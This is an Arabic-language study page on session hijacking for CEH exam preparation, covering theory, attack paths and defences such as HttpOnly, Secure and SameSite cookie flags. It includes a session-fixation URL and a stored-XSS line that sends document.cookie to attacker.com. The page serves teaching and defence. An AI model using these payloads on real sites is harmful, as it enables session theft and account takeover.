🔒 Session Hijacking — اختطاف الجلسة

شرح آليات سرقة واعتراض جلسات المستخدمين النشطة على مستويات التطبيقات والشبكات وطرق الحماية الفعّالة

🛠️ Bettercap · Wireshark · Burp Suite · EditThisCookie 📋 CEH Domain: Session Hijacking (Weight ~6%) CVSS Impact: High (Integrity/Confidentiality)

📚 النظرية — الفرق بين الاختطاف والتزييف وطبقات العمل

تتمحور فكرة الهجوم حول الحصول على Session Token (رمز الجلسة) صالح وصادر بالفعل لمستخدم مصرح له، لتخطي مرحلة تسجيل الدخول بالكامل.

🔍 Hijacking vs Spoofing

  • Session Hijacking (الاختطاف): يتدخل المهاجم في جلسة نشطة وقائمة بالفعل للمستخدم ويقطع اتصاله أو يتقمص شخصيته أثناء اتصاله بالخادم.
  • Session Spoofing (التزييف): يقوم المهاجم بتخمين أو إنشاء رمز جلسة وهمي (أو مسروق مسبقاً) وبدء جلسة جديدة كلياً كأنه المستخدم المستهدف.

🌐 طبقة التطبيق (Application Layer) vs الشبكة (Network Layer)

  • Application Layer: سرقة ملفات تعريف الارتباط (Cookies/Tokens) المخزنة في المتصفح أو الذاكرة عبر ثغرات (XSS, Session Fixation, Man-in-the-Browser).
  • Network Layer: اعتراض الحزم على مستوى الشبكة وتخمين أرقام التسلسل (TCP Sequence Numbers) للتدخل في اتصال TCP قائم بالفعل وتغيير البيانات المرسلة.

🔬 تشريح مسار الهجوم — سرقة الجلسة عبر XSS والـ Fixation

1️⃣
Session Fixation (تثبيت الجلسة)

يقوم المهاجم بإنشاء معرف جلسة صالح على موقع الويب وإرساله للضحية (مثلاً عبر رابط يحتوي على الـ Session ID)، ليدفع الضحية لتسجيل الدخول مستخدماً نفس الـ Session ID المثبت مسبقاً.

# URL payload with fixed session ID sent to victim http://target.com/login.php?PHPSESSID=attacker_fixed_session_123
2️⃣
Session Theft via Stored XSS

استغلال ثغرة XSS لحقن كود جافاسكريبت يقوم بقراءة الـ document.cookie وإرسالها لخادم خارجي يسيطر عليه المهاجم.

# XSS Payload to steal document.cookie <script>fetch('http://attacker.com/log?cookie=' + document.cookie)</script>
3️⃣
TCP Session Hijacking (Network level)

اعتراض البيانات على الشبكة، كشف الـ Sequence Number و Acknowledgment Number، والتنبؤ بالحزمة التالية لإلغاء اتصال الضحية وحقن أوامر ضارة.

🛡️ الحماية والدفاع — تأمين الجلسات وتثبيت ملفات الارتباط

✅ إعدادات ملفات تعريف الارتباط الآمنة (Cookie Flags)

  • HttpOnly: يمنع وصول نصوص جافاسكريبت (مثل XSS) إلى الـ Cookie تماماً.
  • Secure: يضمن عدم إرسال الـ Cookie إلا عبر قنوات اتصال مشفرة بـ HTTPS فقط.
  • SameSite=Strict/Lax: يمنع إرسال ملفات تعريف الارتباط مع الطلبات العابرة للمواقع (حماية من ثغرات CSRF).

🔒 إدارة الجلسة بأمان (Session Management)

  • Regenerate Session ID: تغيير معرف الجلسة فوراً عند نجاح تسجيل دخول المستخدم لتجنب هجمات الـ Session Fixation.
  • Session Timeout: تعيين حد زمني لانتهاء الجلسة تلقائياً عند الخمول.
  • IP & User-Agent Binding: ربط الجلسة بعنوان IP وبصمة المتصفح للمستخدم، وإلغاء الجلسة فوراً عند حدوث أي تغيير مفاجئ.
